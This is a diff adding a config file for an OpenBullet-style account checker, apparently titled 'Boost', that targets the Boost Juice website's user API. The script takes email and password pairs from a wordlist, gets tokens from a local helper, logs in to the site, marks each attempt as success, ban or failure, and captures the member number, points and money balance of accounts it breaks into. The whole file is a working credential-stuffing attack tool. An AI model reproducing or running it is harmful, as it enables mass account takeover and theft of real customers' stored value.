@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "Boost",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-12-06T15:28:30.102368+02:00",
+  "AdditionalInfo": "",
+  "Author": "Neura",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "http://127.0.0.1:1337/generateToken?email=<USER>&pass=<PASS>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+PARSE "<SOURCE>" JSON "key" -> VAR "key" 
+
+REQUEST GET "https://www.boostjuice.com.au/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://www.boostjuice.com.au/api/vibe/user.php" 
+  CONTENT "" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Origin: https://www.boostjuice.com.au" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.boostjuice.com.au/?" 
+  HEADER "token: <token>" 
+  HEADER "key: <key>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+PARSE "<SOURCE>" JSON "Success" -> VAR "Success" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Success>" EqualTo "1" 
+  KEYCHAIN Ban OR 
+    KEY "<Success>" EqualTo "2" 
+  KEYCHAIN Failure OR 
+    KEY "<Success>" EqualTo "0" 
+
+PARSE "<SOURCE>" JSON "MemberNo" CreateEmpty=FALSE -> CAP "MemberNo" 
+
+PARSE "<SOURCE>" JSON "Points" CreateEmpty=FALSE -> CAP "Points" 
+
+PARSE "<SOURCE>" JSON "Money" CreateEmpty=FALSE -> CAP "Money" 
+
